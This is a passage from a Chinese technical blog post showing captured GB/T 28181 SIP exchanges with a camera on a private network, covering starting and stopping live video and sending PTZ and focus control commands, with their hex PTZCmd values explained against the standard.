class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">45056</span> RTP/AVP <span class="hljs-number">96</span> <span class="hljs-number">98</span> <span class="hljs-number">97</span><br><span class="hljs-attribute">a</span>=recvonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">98</span> H264/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">97</span> MPEG4/<span class="hljs-number">90000</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000001002</span><br><span class="hljs-attribute">f</span>=<br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">100</span> Trying<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK2420824424<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">101</span> Dialog Establishement<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK2420824424<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1504032660</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK2420824424<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1504032660</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Type: application/sdp<br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">224</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000001310000001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">s</span>=Play<br><span class="hljs-attribute">i</span>=VCam Live Video<br><span class="hljs-attribute">c</span>=IN IP4 <span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">9712</span> RTP/AVP <span class="hljs-number">96</span><br><span class="hljs-attribute">a</span>=sendonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=streamprofile:<span class="hljs-number">0</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000001002</span><br><span class="hljs-attribute">f</span>=v/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>a/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ACK</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1703481534<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1504032660</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> ACK<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>然后就是媒体推流</p><h4 id="3-2-停止播放"><a href="#3-2-停止播放" class="headerlink" title="3.2 停止播放"></a>3.2 停止播放</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BYE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK3131645526<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1504032660</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> BYE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK3131645526<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1504032660</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> BYE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h3 id="4-云台控制"><a href="#4-云台控制" class="headerlink" title="4. 云台控制"></a>4. 云台控制</h3><h4 id="4-1-PTZ指令（上开始，速度100）"><a href="#4-1-PTZ指令（上开始，速度100）" class="headerlink" title="4.1 PTZ指令（上开始，速度100）"></a>4.1 PTZ指令（上开始，速度100）</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK3624414955<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3814588192</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1922970359</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">36</span>:<span class="hljs-number">53</span>.<span class="hljs-number">107</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">171</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Control&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceControl</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">16</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;PTZCmd&gt;</span><span class="hljs-attribute">A50F000800640020</span>&lt;/PTZCmd&gt;<br><span class="hljs-section">&lt;/Control&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK3624414955<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3814588192</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">861562331</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1922970359</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="4-2-PTZ指令（停止）"><a href="#4-2-PTZ指令（停止）" class="headerlink" title="4.2 PTZ指令（停止）"></a>4.2 PTZ指令（停止）</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK653231184<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3593600802</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3688133832</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">36</span>:<span class="hljs-number">54</span>.<span class="hljs-number">107</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">171</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Control&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceControl</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">17</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;PTZCmd&gt;</span><span class="hljs-attribute">A50F0000000000B4</span>&lt;/PTZCmd&gt;<br><span class="hljs-section">&lt;/Control&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK653231184<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3593600802</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1071595393</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3688133832</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="4-3-PTZCmd值的解释"><a href="#4-3-PTZCmd值的解释" class="headerlink" title="4.3 PTZCmd值的解释"></a>4.3 <code>PTZCmd</code>值的解释</h4><p>摘自GB/T 28181-2016，以下为图片，不可复制</p><img src="/2024/05/newpost-56/image-20240517150405575.png" class="" title="image-20240517150405575"><img src="/2024/05/newpost-56/image-20240517150449404.png" class="" title="image-20240517150449404"><h4 id="4-4-FI指令（聚焦-）"><a href="#4-4-FI指令（聚焦-）" class="headerlink" title="4.4 FI指令（聚焦+）"></a>4.4 FI指令（聚焦+）</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1893957204<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">83028286</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3665056612</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">05</span>:<span class="hljs-number">55</span>.<span class="hljs-number">294</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">171</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Control&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceControl</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">24</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;PTZCmd&gt;</span><span class="hljs-attribute">A50F004100640059</span>&lt;/PTZCmd&gt;<br><span class="hljs-section">&lt;/Control&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1893957204<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">83028286</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1815986646</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3665056612</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="4-5-FI指令（停止）"><a href="#4-5-FI指令（停止）" class="headerlink" title="4.5 FI指令（停止）"></a>4.5 FI指令（停止）</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1990600059<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2805834034</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3546884413</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">05</span>:<span class="hljs-number">56</span>.<span class="hljs-number">294</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">171</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Control&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceControl</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">25</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;PTZCmd&gt;</span><span class="hljs-attribute">A50F0000000000B4</span>&lt;/PTZCmd&gt;<br><span class="hljs-section">&lt;/Control&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1990600059<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2805834034</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span 